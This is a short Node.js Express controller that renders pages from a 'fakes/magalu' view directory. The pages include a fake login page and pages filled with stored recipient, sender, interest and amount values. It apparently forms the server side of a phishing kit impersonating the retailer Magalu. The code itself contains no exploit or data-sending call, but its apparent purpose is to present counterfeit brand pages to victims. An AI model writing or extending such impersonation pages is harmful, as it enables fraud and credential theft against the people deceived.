const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');
const path = require('path');

const magaluModel = require('../models/Magalu.model');

exports.page = async (req, res, next) => {
    try {
        const { page } = req.params;

        const { to, from, interest, amount } = await magaluModel.findOne({
            where: {
                page: page,
            },
        });

        return res.render(`fakes/magalu/${page}`, {
            to: to,
            from: from,
            interest: interest,
            amount: amount,
        });
    } catch (err) {
        return res.render('errors/users/magalu500');
    }
};

exports.login = async (req, res, next) => {
    try {        
        return res.render('fakes/magalu/login');
    } catch (err) {
        console.log(err);
        return res.render('errors/users/magalu500');
    }
}